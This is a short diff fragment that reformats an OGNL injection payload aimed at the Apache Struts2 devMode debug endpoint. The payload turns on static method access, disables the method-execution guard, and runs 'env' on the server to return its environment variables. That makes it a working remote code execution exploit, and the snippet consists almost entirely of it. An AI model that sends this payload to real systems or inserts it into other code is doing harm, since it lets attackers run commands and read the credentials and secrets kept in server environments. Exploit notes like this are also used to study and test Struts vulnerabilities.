@@ -17,7 +17,8 @@ devmode.action?debug=command
     &expression=(
     %23_memberAccess["allowStaticMethodAccess"]=true,
     %23foo=new java.lang.Boolean("false"),
-    %23context["xwork.MethodAccessor.denyMethodExecution"]=%23foo,              @org.apache.commons.io.IOUtils@toString(
+    %23context["xwork.MethodAccessor.denyMethodExecution"]=%23foo,             
+    @org.apache.commons.io.IOUtils@toString(
         @java.lang.Runtime@getRuntime().exec('env').getInputStream()
     )
 )
